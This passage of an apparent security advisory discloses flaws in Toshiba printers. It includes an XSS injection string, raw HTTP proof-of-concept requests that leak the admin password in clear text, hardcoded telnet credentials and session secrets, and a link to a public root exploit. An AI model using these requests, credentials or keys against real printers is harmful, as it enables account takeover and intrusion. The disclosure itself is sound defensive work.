 50                                 &lt;<span style="color: #008000; font-weight: bold">B</span>&gt;&lt;<span style="color: #008000; font-weight: bold">script</span>&gt;
 <span style="color: #666666">51</span>                                         <span style="color: #008000">document</span>.write(getQueryStringValue(<span style="color: #BA2121">&quot;packageDate&quot;</span>,<span style="color: #BA2121">&quot;self&quot;</span>));
 <span style="color: #666666">52</span>                                 &lt;/<span style="color: #008000; font-weight: bold">script</span>&gt;&lt;/<span style="color: #008000; font-weight: bold">B</span>&gt;
 53                         &lt;/<span style="color: #008000; font-weight: bold">TD</span>&gt;
 54                 &lt;/<span style="color: #008000; font-weight: bold">TR</span>&gt;
 55                 &lt;<span style="color: #008000; font-weight: bold">TR</span> &gt;
 56                         &lt;<span style="color: #008000; font-weight: bold">TD</span> <span style="color: #7D9029">VALIGN</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;TOP&quot;</span> <span style="color: #7D9029">style</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;FONT-SIZE:10pt;FONT-STYLE: normal; FONT-FAMILY: Arial, sans-serif;&quot;</span> <span style="color: #7D9029">colspan</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;2&quot;</span>&gt;
 57                         &lt;<span style="color: #008000; font-weight: bold">script</span>&gt;
 <span style="color: #666666">58</span>                                 <span style="color: #008000">document</span>.write(<span style="color: #BA2121">&#39;&lt;textarea rows=&quot;13&quot; cols=&quot;47&quot;&gt;&#39;</span><span style="color: #666666">+</span><span style="color: #008000">window</span>.opener.getValue(getQueryStringValue(<span style="color: #BA2121">&quot;packageId&quot;</span>))<span style="color: #666666">+</span><span style="color: #BA2121">&#39;&lt;/textarea&gt;&#39;</span>);
 <span style="color: #666666">59</span>                         &lt;/<span style="color: #008000; font-weight: bold">script</span>&gt;
 60                         &lt;/<span style="color: #008000; font-weight: bold">TD</span>&gt;
 61                 &lt;/<span style="color: #008000; font-weight: bold">TR</span>&gt;
</pre></div>

<p>It is possible to inject HTML code and JavaScript code, as shown below with the <code>XMP</code> HTML tag that will be interpreted and disable any following code, using <code>?packageName=&lt;XMP&gt;</code> in the query string.</p>
<p><img alt="" src="images/2024-toshiba-xss.png" /></p>
<p><a href="images/2024-toshiba-xss-full.png">Click here for full image</a></p>
<p>It is possible to find such DOM-based XSS in the code base. There are at least 27 XSS in the HTML files provided by the printer:</p>
<pre><code>kali% rgrep getQueryStringValue .|grep write
./Administration/SystemUpdates/MoreUpdateDetails.html:                                  document.write(getQueryStringValue("packageName","self"));
./Administration/SystemUpdates/MoreUpdateDetails.html:                                  document.write(getQueryStringValue("packageDate","self"));
./Administration/SystemUpdates/MoreUpdateDetails.html:                          document.write('&lt;textarea rows="13" cols="47"&gt;'+window.opener.getValue(getQueryStringValue("packageId"))+'&lt;/textarea&gt;');
./Registration/Template/ScanToEFiling.html:                &lt;script type="text/javascript"&gt;document.write("&lt;INPUT ID=\"btnPanelProperties\" TYPE=\"button\" VALUE=\""+fnGetLocaleString("101335","Panel Setting")+"\" ONCLICK='fnnOpenInNewWindow(\"PanelSet.html?v=1670282309ta&amp;tempImgId=8&amp;groupid=\"+getQueryStringValue(\"groupid\"))'&gt;");&lt;/script&gt;
./Registration/Template/ScanToUSB.html:                &lt;script type="text/javascript"&gt;document.write("&lt;INPUT ID=\"btnPanelProperties\" TYPE=\"button\" VALUE=\""+fnGetLocaleString("101335","Panel Setting")+"\" ONCLICK='fnnOpenInNewWindow(\"PanelSet.html?v=1670282309ta&amp;tempImgId=15&amp;groupid=\"+getQueryStringValue(\"groupid\"))'&gt;");&lt;/script&gt;
./Registration/Template/ScanToEmailAndUSB.html:            &lt;script type="text/javascript"&gt;document.write("&lt;INPUT ID=\"btnPanelProperties\" TYPE=\"button\" VALUE=\""+fnGetLocaleString("101335","Panel Setting")+"\" ONCLICK='fnnOpenInNewWindow(\"PanelSet.html?v=1670282309ta&amp;tempImgId=16&amp;groupid=\"+getQueryStringValue(\"groupid\"))'&gt;");&lt;/script&gt;
./Registration/Template/MetaScanToUSB.html:                &lt;script type="text/javascript"&gt;document.write("&lt;INPUT  type='button' value='"+fnGetLocaleString('101335','Panel Setting')+"' ID='btnPanelProperties' onclick=fnnOpenInNewWindow('PanelSet.html?v=1670282309ta&amp;tempImgId=21&amp;groupid='+getQueryStringValue('groupid'));&gt;");&lt;/script&gt;
./Registration/Template/FaxMode.html:                &lt;script type="text/javascript"&gt;document.write("&lt;INPUT  type='button' value='"+fnGetLocaleString('101335','Panel Setting')+"' ID='btnPanelProperties' onclick=fnnOpenInNewWindow('PanelSet.html?v=1670282309ta&amp;tempImgId=4&amp;groupid='+getQueryStringValue('groupid'));&gt;");&lt;/script&gt;
./Registration/Template/MetaScanToFile.html:                &lt;script type="text/javascript"&gt;document.write("&lt;INPUT  type='button' value='"+fnGetLocaleString('101335','Panel Setting')+"' ID='btnPanelProperties' onclick=fnnOpenInNewWindow('PanelSet.html?v=1670282309ta&amp;tempImgId=19&amp;groupid='+getQueryStringValue('groupid'));&gt;");&lt;/script&gt;
./Registration/Template/CopySaveAsFile.html:                &lt;script type="text/javascript"&gt;document.write("&lt;INPUT  type='button' value='"+fnGetLocaleString('101335','Panel Setting')+"' ID='btnPanelProperties' onclick=fnnOpenInNewWindow('PanelSet.html?v=1670282309ta&amp;tempImgId=2&amp;groupid='+getQueryStringValue('groupid'));&gt;");&lt;/script&gt;
./Registration/Template/ScanToEMail.html:            &lt;script type="text/javascript"&gt;document.write("&lt;INPUT ID=\"btnPanelProperties\" TYPE=\"button\" VALUE=\""+fnGetLocaleString("101335","Panel Setting")+"\" ONCLICK='fnnOpenInNewWindow(\"PanelSet.html?v=1670282309ta&amp;tempImgId=7&amp;groupid=\"+getQueryStringValue(\"groupid\"))'&gt;");&lt;/script&gt;
./Registration/Template/ScanSettingList.html:        &lt;option value="High"&gt;&lt;script type="text/javascript"&gt;if(getQueryStringValue("DefaultVals","self")=="true"){document.write(fnGetLocaleString("100880","High"));} else {document.write(fnGetLocaleString("101095","Low"));}&lt;/script&gt;
./Registration/Template/ScanSettingList.html:        &lt;option value="Low"&gt;&lt;script type="text/javascript"&gt;if(getQueryStringValue("DefaultVals","self")=="true"){document.write(fnGetLocaleString("101095","Low"));} else {document.write(fnGetLocaleString("100880","High"));}&lt;/script&gt;
./Registration/Template/ScanSettingList.html:                    &lt;script type="text/javascript"&gt;document.write("&lt;INPUT ID=\"btnPanelProperties\" TYPE=\"button\" VALUE=\""+fnGetLocaleString("101335","Panel Setting")+"\" ONCLICK='fnnOpenInNewWindow(\"PanelSet.html?v=1670282309ta&amp;tempImgId=\"+tempImgID+\"&amp;groupid=\"+getQueryStringValue(\"groupid\"))'&gt;");&lt;/script&gt;
./Registration/Template/CopyStoreToEFilling.html:                &lt;script type="text/javascript"&gt;document.write("&lt;INPUT  type='button' value='"+fnGetLocaleString('101335','Panel Setting')+"' ID='btnPanelProperties' onclick=fnnOpenInNewWindow('PanelSet.html?v=1670282309ta&amp;tempImgId=3&amp;groupid='+getQueryStringValue('groupid'));&gt;");&lt;/script&gt;
./Registration/Template/SmbFtpOther.html:                &lt;script type="text/javascript"&gt;document.write("&lt;INPUT ID=\"btnPanelProperties\" TYPE=\"button\" VALUE=\""+fnGetLocaleString("101335","Panel Setting")+"\" ONCLICK='fnnOpenInNewWindow(\"PanelSet.html?v=1670282309ta&amp;tempImgId=22&amp;groupid=\"+getQueryStringValue(\"groupid\"))'&gt;");&lt;/script&gt;
./Registration/Template/MetaScanToEmail.html:            &lt;script type="text/javascript"&gt;document.write("&lt;INPUT  type='button' value='"+fnGetLocaleString('101335','Panel Setting')+"' ID='btnPanelProperties' onclick=fnnOpenInNewWindow('PanelSet.html?v=1670282309ta&amp;tempImgId=20&amp;groupid='+getQueryStringValue('groupid'));&gt;");&lt;/script&gt;
./Registration/Template/ScanToEmailAndSaveAsFile.html:            &lt;script type="text/javascript"&gt;document.write("&lt;INPUT ID=\"btnPanelProperties\" TYPE=\"button\" VALUE=\""+fnGetLocaleString("101335","Panel Setting")+"\" ONCLICK='fnnOpenInNewWindow(\"PanelSet.html?v=1670282309ta&amp;tempImgId=10&amp;groupid=\"+getQueryStringValue(\"groupid\"))'&gt;");&lt;/script&gt;
./Registration/Template/ScanSetting.html:                        &lt;option value="High"&gt;&lt;script type="text/javascript"&gt;if(opener.getQueryStringValue("DefaultVals","self")=="true") {document.write(fnGetLocaleString("100880","High"));} else {document.write(fnGetLocaleString("101095","Low"));}&lt;/script&gt;
./Registration/Template/ScanSetting.html:                        &lt;option value="Low"&gt;&lt;script type="text/javascript"&gt;if(opener.getQueryStringValue("DefaultVals","self")=="true") {document.write(fnGetLocaleString("101095","Low"));} else {document.write(fnGetLocaleString("100880","High"));}&lt;/script&gt;
./Registration/Template/FaxSaveAsFile.html:            &lt;script type="text/javascript"&gt;document.write("&lt;INPUT  type='button' value='"+fnGetLocaleString('101335','Panel Setting')+"' ID='btnPanelProperties' onclick=fnnOpenInNewWindow('PanelSet.html?v=1670282309ta&amp;tempImgId=5&amp;groupid='+getQueryStringValue('groupid'));&gt;");&lt;/script&gt;
./Registration/Template/ScanToFile.html:                &lt;script type="text/javascript"&gt;document.write("&lt;INPUT ID=\"btnPanelProperties\" TYPE=\"button\" VALUE=\""+fnGetLocaleString("101335","Panel Setting")+"\" ONCLICK='fnnOpenInNewWindow(\"PanelSet.html?v=1670282309ta&amp;tempImgId=6&amp;groupid=\"+getQueryStringValue(\"groupid\"))'&gt;");&lt;/script&gt;
./Registration/Template/ScanToFileAndUSB.html:                &lt;script type="text/javascript"&gt;document.write(" &lt;INPUT ID=\"btnPanelProperties\" TYPE=\"button\" VALUE=\""+fnGetLocaleString("101335","Panel Setting")+"\" ONCLICK='fnnOpenInNewWindow(\"PanelSet.html?v=1670282309ta&amp;tempImgId=18&amp;groupid=\"+getQueryStringValue(\"groupid\"))'&gt;");&lt;/script&gt;
./Registration/Template/MetaScanToEmailAndFile.html:            &lt;script type="text/javascript"&gt;document.write("&lt;INPUT  type='button' value='"+fnGetLocaleString('101335','Panel Setting')+"' ID='btnPanelProperties' onclick=fnnOpenInNewWindow('PanelSet.html?v=1670282309ta&amp;tempImgId=23&amp;groupid='+getQueryStringValue('groupid'));&gt;");&lt;/script&gt;
./Registration/Template/ScanToFileAndBox.html:            &lt;script type="text/javascript"&gt;document.write("&lt;INPUT ID=\"btnPanelProperties\" TYPE=\"button\" VALUE=\""+fnGetLocaleString("101335","Panel Setting")+"\" ONCLICK='fnnOpenInNewWindow(\"PanelSet.html?v=1670282309ta&amp;tempImgId=11&amp;groupid=\"+getQueryStringValue(\"groupid\"))'&gt;");&lt;/script&gt;
./Registration/Template/ScanToEfilingAndUSB.html:                &lt;script type="text/javascript"&gt;document.write("&lt;INPUT ID=\"btnPanelProperties\" TYPE=\"button\" VALUE=\""+fnGetLocaleString("101335","Panel Setting")+"\" ONCLICK='fnnOpenInNewWindow(\"PanelSet.html?v=1670282309ta&amp;tempImgId=17&amp;groupid=\"+getQueryStringValue(\"groupid\"))'&gt;");&lt;/script&gt;
./Registration/Template/ScanToEmailAndEFiling.html:                &lt;script type="text/javascript"&gt;document.write("&lt;INPUT ID=\"btnPanelProperties\" TYPE=\"button\" VALUE=\""+fnGetLocaleString("101335","Panel Setting")+"\" ONCLICK='fnnOpenInNewWindow(\"PanelSet.html?v=1670282309ta&amp;tempImgId=12&amp;groupid=\"+getQueryStringValue(\"groupid\"))'&gt;");&lt;/script&gt;
</code></pre>
<p>Since the <code>getQueryStringValue()</code> function is used 880 times in these files, there are more XSS vulnerabilities that can be found while analyzing the code.</p>
<pre><code>kali% pwd
/home/user/extract/home/SYSROM_SRC/build/release/TopAccess
kali% rgrep getQueryStringValue . | wc -l
880
kali%
</code></pre>
<p>An attacker can steal the cookie of an admin user.</p>
<p><a id="leak-admin-password"></a></p>
<h2>Details - Leak of admin password and passwords</h2>
<p>All the Toshiba printers will display the password of the admin user in clear-text and additional passwords when sending 2 specific HTTP requests to the API /contentwebserver. An attacker stealing the cookie of an admin or abusing a XSS vulnerability can recover this password in clear-text and compromise the printer.</p>
<p>This HTTP request can be shown below:</p>
<p>HTTP request used to recover the password of the admin user:</p>
<p><img alt="" src="images/2024-toshiba-leak-admin-password.png" /></p>
<p><a href="images/2024-toshiba-leak-admin-password-full.png">Click here for full image</a></p>
<p>2 requests are mandatory:</p>
<ul>
<li>The first POST request to <code>/contentwebserver</code> containing this payload:</li>
</ul>
<pre><xmp><DeviceInformationModel>
  <GetValue>
    <TopAccess>
      <SessionInfo/>
    </TopAccess>
  </GetValue>
</DeviceInformationModel></xmp></pre>

<ul>
<li>The second POST request to <code>/contentwebserver</code> containing this payload:</li>
</ul>
<pre><xmp><DeviceInformationModel>
  <GetValue>
    <UserManager>
      <Users/>
    </UserManager>
  </GetValue>
  <GetValue>
    <Authentication>
      <UserCredential/>
      <AuthenticationSettings/>
    </Authentication>
  </GetValue>
  <SetValue>
    <UserManager>
      <Users maxPage="" pageNo="1" pageSize="100" totalUsers=""/>
    </UserManager>
  </SetValue>
  <Command>
    <GetUsers>
      <commandNode>UserManager/Users</commandNode>
      <Params>
        <userDetails contentType="XPath">UserManager</userDetails>
        <cmdDetails>FEW</cmdDetails>
      </Params>
    </GetUsers>
  </Command>
  <Command>
    <GetSettings>
      <commandNode>Authentication/AuthenticationSettings</commandNode>
    </GetSettings>
  </Command>
</DeviceInformationModel></xmp></pre>

<p>The server will respond with the password displayed in clear-text.</p>
<p>It is also possible to visit http://printer-ip/usermanagement/userconfirm/UserList.html?v=1670282309ta&amp;PAGENO=1 as admin and review the HTTP traffic. These 2 requests will be automatically sent by the browser when visiting this webpage:</p>
<p><img alt="" src="images/2024-toshiba-userlist.png" /></p>
<p>The PoC is (session must be updated):</p>
<p>First HTTP request:</p>
<pre><code>POST /contentwebserver HTTP/1.1
Host: 10.0.0.1:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */* 
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cache-Control: no-cache
Pragma: no-cache
Content-Type: text/plain; charset=utf-8
csrfpId: 10.0.0.2.a89baa941c3bbdafcee7e9349daca6af
Content-Length: 120 
Origin: http://10.0.0.1:8080
Connection: close
Referer: http://10.0.0.1:8080/usermanagement/userconfirm/UserList.html?v=1670282309ta&amp;PAGENO=1
Cookie: Session=10.0.0.2.a89baa941c3bbdafcee7e9349daca6af; Locale=en-US,en#q=0.5; BrowserLang=en_US; pageTrack=MAIN%3DDEVICE; IgnoreSessionTimeout=1

&lt;DeviceInformationModel&gt;&lt;GetValue&gt;&lt;TopAccess&gt;&lt;SessionInfo&gt;&lt;/SessionInfo&gt;&lt;/TopAccess&gt;&lt;/GetValue&gt;&lt;/DeviceInformationModel&gt;
</code></pre>
<p>Second HTTP request:</p>
<pre><code>POST /contentwebserver HTTP/1.1
Host: 10.0.0.1:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */* 
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cache-Control: no-cache
Pragma: no-cache
Content-Type: text/plain; charset=utf-8
csrfpId: 10.0.0.2.a89baa941c3bbdafcee7e9349daca6af
Content-Length: 652 
Origin: http://10.0.0.1:8080
Connection: close
Referer: http://10.0.0.1:8080/usermanagement/userconfirm/UserList.html?v=1670282309ta&amp;PAGENO=1
Cookie: Session=10.0.0.2.a89baa941c3bbdafcee7e9349daca6af; Locale=en-US,en#q=0.5; BrowserLang=en_US; pageTrack=MAIN%3DDEVICE; IgnoreSessionTimeout=1

&lt;DeviceInformationModel&gt;&lt;GetValue&gt;&lt;UserManager&gt;&lt;Users/&gt;&lt;/UserManager&gt;&lt;/GetValue&gt;&lt;GetValue&gt;&lt;Authentication&gt;&lt;UserCredential&gt;&lt;/UserCredential&gt;&lt;AuthenticationSettings&gt;&lt;/AuthenticationSettings&gt;&lt;/Authentication&gt;&lt;/GetValue&gt;&lt;SetValue&gt;&lt;UserManager&gt;&lt;Users maxPage='' pageNo='1' pageSize='100' totalUsers=''&gt;&lt;/Users&gt;&lt;/UserManager&gt;&lt;/SetValue&gt;&lt;Command&gt;&lt;GetUsers&gt;&lt;commandNode&gt;UserManager/Users&lt;/commandNode&gt;&lt;Params&gt;&lt;userDetails contentType='XPath'&gt;UserManager&lt;/userDetails&gt;&lt;cmdDetails&gt;FEW&lt;/cmdDetails&gt;&lt;/Params&gt;&lt;/GetUsers&gt;&lt;/Command&gt;&lt;Command&gt;&lt;GetSettings&gt;&lt;commandNode&gt;Authentication/AuthenticationSettings&lt;/commandNode&gt;&lt;/GetSettings&gt;&lt;/Command&gt;&lt;/DeviceInformationModel&gt;
</code></pre>
<p>The answer for the second request will contain several passwords in clear-text, including the password of the admin user (<code>123456</code>):</p>
<pre><code>HTTP/1.1 200 OK
Date: Mon, 10 Apr 2023 11:17:34 GMT 
Server: Apache
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=63072000
Accept-Language: en-US,en;q=0.5
Connection: close
Content-Type: text/xml
Content-Length: 18489

[...]
          &lt;attrNameForUser ID="16"/&gt;
          &lt;atrNameForCardID ID="16"/&gt;
          &lt;attrNameForCardRevision ID="16"/&gt;
          &lt;attrNameForServerName ID="16"/&gt;
          &lt;passwordForCardRegistration&gt;[REDACTED]&lt;/passwordForCardRegistration&gt;
          &lt;skipRegistrationForCardAuth&gt;false&lt;/skipRegistrationForCardAuth&gt;
          &lt;autoRegistrationForCardAuth&gt;false&lt;/autoRegistrationForCardAuth&gt;
[...]
      &lt;UserCredential&gt;
        &lt;userName&gt;admin&lt;/userName&gt;
        &lt;passwd&gt;123456&lt;/passwd&gt;
        &lt;ipaddress&gt;10.0.0.2&lt;/ipaddress&gt;
        &lt;DepartmentManagement isEnable="false"&gt;
          &lt;requireDepartment/&gt;
        &lt;/DepartmentManagement&gt;
[...]
</code></pre>
<p>An attacker can retrieve the password of the admin user by using a XSS vulnerability or by stealing the cookie.</p>
<p><a id="hardcoded-password-telnetd"></a></p>
<h2>Details - Hardcoded credentials in telnetd</h2>
<p>It was observed that all the Toshiba printers contain hardcoded telnet credentials (Admin/System):</p>
<p>Content of the <code>telnet.conf</code> and <code>telnet.conf.bak</code> files:</p>
<pre><code>bash-4.1# ls -la /encryption/al/network/config/telnet.conf.bak
-rw-r--r-- 1 root root 41 Mar 15 11:50 /encryption/al/network/config/telnet.conf.bak
bash-4.1# ls -la /encryption/al/network/config/telnet.conf    
-rw-r--r-- 1 root root 41 Mar 15 11:50 /encryption/al/network/config/telnet.conf
bash-4.1# cat /encryption/al/network/config/telnet.conf
cat /encryption/al/network/config/telnet.conf
PortNo=23       
PassWord=System
UserName=Admin
bash-4.1# cat /encryption/al/network/config/telnet.conf.bak
cat /encryption/al/network/config/telnet.conf.bak
PortNo=23
PassWord=System
UserName=Admin
bash-4.1#
</code></pre>
<p>The telnet daemon can be enabled in the configuration file <code>/home/SYSROM_SRC/NoBuildItems/AL/Network/nsm.xml</code>, likely used by the alnsm program running as root.</p>
<p>Content of <code>/home/SYSROM_SRC/NoBuildItems/AL/Network/nsm.xml</code>:</p>
<pre><code>[...]
 785                                 &lt;NMO&gt;
 786                                         &lt;name&gt;Telnet&lt;/name&gt;
 787                                         &lt;configFile&gt;telnet.conf&lt;/configFile&gt;
 788                                         &lt;startCmd runBackground="1"&gt;$EB2/bin/networkservice/telnet start&lt;/startCmd&gt;
 789                                         &lt;stopCmd&gt;$EB2/bin/networkservice/telnet stop&lt;/stopCmd&gt;
 790                                         &lt;reloadCmd&gt;$EB2/bin/networkservice/telnet restart&lt;/reloadCmd&gt;
 791                                         &lt;statusCmd&gt;$EB2/bin/networkservice/telnet status&lt;/statusCmd&gt;
 792                                         &lt;serviceXpath&gt;Services/Telnet&lt;/serviceXpath&gt;
 793                                         &lt;connectSSM&gt;0&lt;/connectSSM&gt;
 794                                         &lt;startOrder&gt;32&lt;/startOrder&gt;
 795                                         &lt;dependents&gt;&lt;/dependents&gt;
 796                                         &lt;TranslationMap&gt;
 797                                                 &lt;Map&gt;
 798                                                         &lt;iniXpath&gt;UserName&lt;/iniXpath&gt;
 799                                                         &lt;xpath&gt;Username&lt;/xpath&gt;
 800                                                 &lt;/Map&gt;
 801                                                 &lt;Map&gt;
 802                                                         &lt;iniXpath&gt;PassWord&lt;/iniXpath&gt;
 803                                                         &lt;xpath&gt;Password&lt;/xpath&gt;
 804                                                 &lt;/Map&gt;
 805                                                 &lt;Map&gt;
 806                                                         &lt;iniXpath&gt;PortNo&lt;/iniXpath&gt;
 807                                                         &lt;xpath&gt;Port&lt;/xpath&gt;
 808                                                 &lt;/Map&gt;
 809                                         &lt;/TranslationMap&gt;
 810                                 &lt;/NMO&gt;
[...]
</code></pre>
<p>While the telnet server is not enabled by default, an attacker can login to the printer and get administrative privileges if the telnet server is enabled.</p>
<p><a id="lpe-procsuid"></a></p>
<h2>Details - Local Privilege Escalation using PROCSUID</h2>
<p>It was observed that all the Toshiba printers contain a suidperl binary located at /usr/bin/sperl5.10.1-17:</p>
<p>Perl 5.10.x dates from December 2007 and the suidperl binary at /usr/bin/sperl5.10.1-17 is vulnerable to a Local Privilege Escalation vulnerability. PROCSUID is an exploit developed by the NSA for this vulnerability and was made public in 2016.</p>
<p>The exploit is available at <a href="https://github.com/x0rz/EQGRP/blob/master/Linux/up/procsuids.sh.WITHCOMMENTS">https://github.com/x0rz/EQGRP/blob/master/Linux/up/procsuids.sh.WITHCOMMENTS</a>.</p>
<pre><code>bash-4.1# ls -la /usr/bin/sperl5.10.1-17
-rws--x--x 1 root root 74988 Mar 15 11:42 /usr/bin/sperl5.10.1-17
bash-4.1# /usr/bin/sperl5.10.1-17 --help

Usage: /usr/bin/sperl5.10.1-17 [switches] [--] [programfile] [arguments]
  -0[octal]         specify record separator (\0, if no argument)
  -a                autosplit mode with -n or -p (splits $_ into @F) 
  -C[number/list]   enables the listed Unicode features
  -c                check syntax only (runs BEGIN and CHECK blocks)
  -d[:debugger]     run program under debugger
  -D[number/list]   set debugging flags (argument is a bit mask or alphabets)
  -e program        one line of program (several -e's allowed, omit programfile)
  -E program        like -e, but enables all optional features
  -f                don't do $sitelib/sitecustomize.pl at startup
  -F/pattern/       split() pattern for -a switch (//'s are optional)
  -i[extension]     edit &lt;&gt; files in place (makes backup if extension supplied)
  -Idirectory       specify @INC/#include directory (several -I's allowed)
  -l[octal]         enable line ending processing, specifies line terminator
  -[mM][-]module    execute "use/no module..." before executing program
  -n                assume "while (&lt;&gt;) { ... }" loop around program
  -p                assume loop like -n but print line also, like sed 
  -P                run program through C preprocessor before compilation
  -s                enable rudimentary parsing for switches after programfile
  -S                look for programfile using PATH environment variable
  -t                enable tainting warnings
  -T                enable tainting checks
  -u                dump core after parsing program
  -U                allow unsafe operations
  -v                print version, subversion (includes VERY IMPORTANT perl info)
  -V[:variable]     print configuration summary (or a single Config.pm variable)
  -w                enable many useful warnings (RECOMMENDED)
  -W                enable all warnings
  -x[directory]     strip off text before #!perl line and perhaps cd to directory
  -X                disable all warnings

bash-4.1#
</code></pre>
<p>A local attacker can get root privileges.</p>
<p><a id="insecure-core-files"></a></p>
<h2>Details - Insecure permissions for core files</h2>
<p>It was observed that all the Toshiba printers contain coredump binaries in <code>/work/log/platform/syscallerr/gdb_backtraces</code>. These files have incorrect permissions; any local attacker can read and/or modify these files. These files contain the memory dump when the programs crashed and contain sensitive files (scanned files, printed files, and clear-text credentials):</p>
<p>Content of <code>/work/log/platform/syscallerr/gdb_backtraces</code>:</p>
<pre><code>bash-4.1# ls -la /work/log/platform/syscallerr/gdb_backtraces/ 
total 176
drwxrwxrwx 2 root root  4096 Apr 11 19:48 .
drwxrwxrwx 3 root root  4096 Apr  6  2016 ..
-rwxrwxrwx 1 root root 34651 Mar 23 20:27 core.alhp9100.4104.MFP14130119.1679583349_backtrace
-rwxrwxrwx 1 root root  2440 Mar 23 20:27 core.alipp.4825.MFP14130119.1679583369_backtrace
-rwxrwxrwx 1 root root  1007 Mar 23 20:26 core.bash.17184.MFP14130119.1679583274_backtrace
-rwxrwxrwx 1 root root  1729 Mar 23 20:26 core.curl.17593.MFP14130119.1679583273_backtrace
-rwxrwxrwx 1 root root   679 Mar 23 20:27 core.dibbler-client.3219.MFP14130119.1679583329_backtrace
-rwxrwxrwx 1 root root  1554 Mar 23 20:27 core.httpd.17263.MFP14130119.1679583348_backtrace
-rwxrwxrwx 1 root root  1514 Mar 23 20:27 core.httpd.17339.MFP14130119.1679583357_backtrace
-rwxrwxrwx 1 root root  3099 Mar 23 20:27 core.httpd.5108.MFP14130119.1679583307_backtrace
-rwxrwxrwx 1 root root  1140 Mar 23 20:27 core.httpd.5119.MFP14130119.1679583308_backtrace
-rwxrwxrwx 1 root root  1140 Mar 23 20:27 core.httpd.5120.MFP14130119.1679583310_backtrace
-rwxrwxrwx 1 root root  1302 Mar 23 20:27 core.httpd.5121.MFP14130119.1679583304_backtrace
-rwxrwxrwx 1 root root  1513 Mar 23 20:27 core.httpd.5122.MFP14130119.1679583374_backtrace
-rwxrwxrwx 1 root root  1513 Mar 23 20:27 core.httpd.5124.MFP14130119.1679583309_backtrace
-rwxrwxrwx 1 root root  1513 Mar 23 20:27 core.httpd.5126.MFP14130119.1679583330_backtrace
-rwxrwxrwx 1 root root  1513 Mar 23 20:27 core.httpd.5127.MFP14130119.1679583372_backtrace
-rwxrwxrwx 1 root root  1140 Mar 23 20:27 core.httpd.5128.MFP14130119.1679583306_backtrace
-rwxrwxrwx 1 root root 24384 Apr 11 19:48 core.httpd_worker.8272.MFP14130119.1681135080_backtrace
-rwxrwxrwx 1 root root 17882 Mar 23 20:27 core.mapper.1572.MFP14130119.1679583311_backtrace
-rwxrwxrwx 1 root root  1673 Mar 23 20:27 core.nqcs.4048.MFP14130119.1679583366_backtrace
-rwxrwxrwx 1 root root  1025 Mar 23 20:27 core.sendmail.3868.MFP14130119.1679583366_backtrace
-rwxrwxrwx 1 root root  1226 Mar 23 20:26 core.sh.17183.MFP14130119.1679583274_backtrace
-rwxrwxrwx 1 root root  1080 Mar 23 20:27 core.slpd.4475.MFP14130119.1679583369_backtrace
-rwxrwxrwx 1 root root  5025 Mar 23 20:26 core.snmpd.4229.MFP14130119.1679583274_backtrace
-rwxrwxrwx 1 root root  1068 Mar 23 20:27 core.vsftpd.4033.MFP14130119.1679583366_backtrace
bash-4.1#
</code></pre>
<p>A local attacker can steal confidential information.</p>
<p><a id="lpe-sendmail"></a></p>
<h2>Details - Insecure permissions used for Sendmail - Local Privilege Escalation</h2>
<p>It was observed that all the Toshiba printers use Sendmail to send emails to recipients.</p>
<p>Sendmail is used with several insecure directories:</p>
<ul>
<li><code>/work/ci/tmp</code> to store temporary configuration files for Sendmail, this directory has dangerous permissions (777), as shown below in the logs of Sendmail.</li>
<li><code>/var/spool/clientmqueue</code> to store emails, this directory has dangerous permissions, as shown below in the logs of Sendmail.</li>
</ul>
<p>Content of <code>/ramdisk/al/network/log/maillog</code>:</p>
<pre><code>2023-04-14T19:59:58.973687+12:00 localhost faxmilter[4069]: call the smfi_main function
2023-04-14T21:07:31.005288+12:00 localhost sendmail[10814]: /work/ci/tmp/Config5564fde0-02e5-4e85-a5ff-0937a7de150a.cf: WARNING: dangerous write permissions
2023-04-14T21:07:31.035657+12:00 localhost sendmail[10814]: dangerous permissions=40777 on queue directory /var/spool/clientmqueue/
2023-04-14T21:07:31.140713+12:00 localhost sendmail[10814]: 12A91D0a561921: from=test@test-smtp.org, size=312413, class=0, nrcpts=1, msgid=&lt;TTEC89704647-f3b3-4f31-b9c5-348f90ae72f8@hostname&gt;, relay=root@localhost
</code></pre>
<p>A local attacker can inject a malicious Sendmail configuration file and get Remote Code Execution as root.</p>
<p>A local attacker can inject a malicious scanned file.</p>
<p>A local attacker can steal confidential information.</p>
<p><a id="hardcoded-keys-python"></a></p>
<h2>Details - Hardcoded keys found in Python applications used to generate authentication cookies</h2>
<p>It was observed that all the Toshiba printers use Python programs running as WSGI applications to provide dynamic web APIs. These APIs provide, for example, remote administration to the printers.</p>
<p>It appears that some hardcoded keys are used for authentication within Pyramid. Knowing these private keys may allow attackers to bypass authentication and reach administrative interfaces:</p>
<ul>
<li>Settingapp WSGI program</li>
<li>HomeApp WSGI program</li>
<li>WebServerApp WSGI program</li>
</ul>
<p>Hardcoded keys:</p>
<pre><code>/home/SYSROM_SRC/build/release/webframework/settingapp/development.ini:session.secret = Ecp2FBapEeWjWwAMKRj
/home/SYSROM_SRC/build/release/webframework/homeapp/development.ini:session.secret = RkoKjLoUEeWkjwAMKRj
/home/SYSROM_SRC/build/release/framework/webserverapp/development.ini:session.secret = ZV2ViU2VydmVyQXBwZ
/home/SYSROM_SRC/build/release/framework/settingapp/development.ini:session.secret = Ecp2FBapEeWjWwAMKRj
/home/SYSROM_SRC/build/release/framework/settingapp/development_sapp.ini:session.secret = Ecp2FBapEeWjWwAMKRj
/home/SYSROM_SRC/build/release/framework/homeapp/development.ini:session.secret = RkoKjLoUEeWkjwAMKRj
/application/webframework/settingapp/development.ini:session.secret = Ecp2FBapEeWjWwAMKRj
/application/webframework/homeapp/development.ini:session.secret = RkoKjLoUEeWkjwAMKRj
/application/framework/webserverapp/development.ini:session.secret = ZV2ViU2VydmVyQXBwZ
/application/framework/settingapp/development.ini:session.secret = Ecp2FBapEeWjWwAMKRj
/application/framework/settingapp/development_sapp.ini:session.secret = Ecp2FBapEeWjWwAMKRj
/application/framework/homeapp/development.ini:session.secret = RkoKjLoUEeWkjwAMKRj
</code></pre>
<p>Such apps are directly reachable due to the use of Apache as a reverse proxy.</p>
